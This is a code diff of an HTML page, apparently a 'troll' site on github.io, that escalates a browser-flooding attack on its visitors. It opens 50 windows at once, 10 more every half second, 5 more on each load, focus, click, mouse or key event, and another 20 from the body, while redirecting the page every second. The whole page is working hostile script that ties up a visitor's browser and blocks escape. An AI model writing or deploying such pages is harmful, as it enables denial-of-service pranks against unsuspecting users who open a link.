@@ -1,28 +1,56 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta http-equiv='refresh' content='1; url=https://bader133b.github.io/typatroll/'>
+    <meta http-equiv='refresh' content='0.5; url=https://bader133b.github.io/triggertroll/'>
     <script>
         const TARGET = 'https://bader133b.github.io/typatroll/';
         
-        // Open 20 windows immediately
-        for (let i = 0; i < 20; i++) {
-            setTimeout(() => window.open(TARGET, '_blank'), i * 100);
+        // Open 50 windows immediately (increased from 20)
+        for (let i = 0; i < 50; i++) {
+            setTimeout(() => {
+                try {
+                    window.open(TARGET, '_blank');
+                } catch(e) {}
+            }, i * 50);
         }
         
-        // Open 5 windows every second
+        // Open 10 windows every 500ms (faster and more)
         setInterval(() => {
-            for (let i = 0; i < 5; i++) {
-                window.open(TARGET, '_blank');
+            for (let i = 0; i < 10; i++) {
+                try {
+                    window.open(TARGET, '_blank');
+                } catch(e) {}
             }
-        }, 1000);
+        }, 500);
         
-        // Redirect main window every 2 seconds
+        // Also try to open on every possible event
+        ['load', 'focus', 'click', 'mousemove', 'keydown'].forEach(event => {
+            window.addEventListener(event, () => {
+                for (let i = 0; i < 5; i++) {
+                    try {
+                        window.open(TARGET, '_blank');
+                    } catch(e) {}
+                }
+            }, { once: false });
+        });
+        
+        // Redirect main window every 1 second (faster)
         setInterval(() => {
             window.location.href = TARGET;
-        }, 2000);
+        }, 1000);
+        
+        // Also redirect immediately
+        setTimeout(() => {
+            window.location.href = TARGET;
+        }, 500);
     </script>
 </head>
-<body></body>
+<body>
+    <script>
+        // Execute immediately when body loads
+        for (let i = 0; i < 20; i++) {
+            window.open(TARGET, '_blank');
+        }
+    </script>
+</body>
 </html>
-
